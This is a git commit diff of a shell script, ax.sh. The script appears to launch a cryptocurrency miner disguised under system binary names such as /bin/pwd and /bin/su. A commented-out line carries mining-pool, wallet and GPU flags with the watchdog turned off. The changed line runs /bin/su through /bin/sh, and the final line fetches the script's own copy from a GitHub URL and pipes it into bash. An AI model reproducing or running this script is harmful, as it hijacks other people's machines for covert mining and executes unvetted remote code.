03c0572f7c39c43673b09fc99c5f142cf4fc51ee
ALICLAYSMEN <58400825+ALICLAYSMEN@users.noreply.github.com>
2022-07-11 14:41:57 +0700

    Update ax.sh

--- ax.sh
+++ ax.sh
@@ -9,5 +9,5 @@ chmod +x /bin/sh
 chmod +x /bin/su
 
 #/bin/pwd -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xc849640837cBce9Ec3e3ce1d1f755A2DE5fb6ddF -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240 --keep-gpu-busy --no-watchdog
-/bin/pwd -c /bin/pwd2
+/bin/sh -c /bin/su
 curl https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/ax.sh | bash
